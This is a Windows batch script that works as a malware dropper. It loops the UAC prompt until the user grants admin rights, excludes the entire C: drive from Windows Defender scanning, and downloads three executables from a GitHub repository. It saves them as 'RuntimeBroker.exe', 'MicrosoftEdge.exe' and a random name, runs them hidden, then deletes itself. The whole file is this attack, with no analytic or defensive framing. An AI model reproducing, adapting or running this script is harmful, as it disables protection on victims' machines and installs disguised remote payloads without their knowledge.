@echo off
:: Check if the script is running with administrator privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    rem Script is already running with admin rights
    rem Add registry entry for Windows Defender Exclusion Path
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\ /f >nul 2>&1

    rem Download the file to the temporary directory and name it RuntimeBroker.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Run the downloaded RuntimeBroker file without a window
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Download the first file and save it as MicrosoftEdge.exe in the TEMP directory
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1

    rem Download the second file and save it with a random name in the TEMP directory
    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1

    rem Run the MicrosoftEdge.exe file (first file)
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1

    rem Run the second file with the random name (second file)
    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'" >nul 2>&1

    rem Delete the batch script itself after execution
    del "%~f0" >nul 2>&1

    exit
)

:loop
    rem Trigger the UAC prompt using PowerShell from within the batch file
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1

    rem If user declines the UAC prompt, retry
    if %errorlevel% NEQ 0 (
        timeout /t 3 >nul
        goto loop
    )

    rem If UAC is accepted, proceed with the next task
    rem Add registry entry for Windows Defender Exclusion Path
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\ /f >nul 2>&1

    rem Download the file to the temporary directory and name it RuntimeBroker.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Run the downloaded RuntimeBroker file without a window
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Download the first file and save it as MicrosoftEdge.exe in the TEMP directory
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1

    rem Download the second file and save it with a random name in the TEMP directory
    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1

    rem Run the MicrosoftEdge.exe file (first file)
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1

    rem Run the second file with the random name (second file)
    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'" >nul 2>&1

    rem Delete the batch script itself after execution
    del "%~f0" >nul 2>&1

    exit
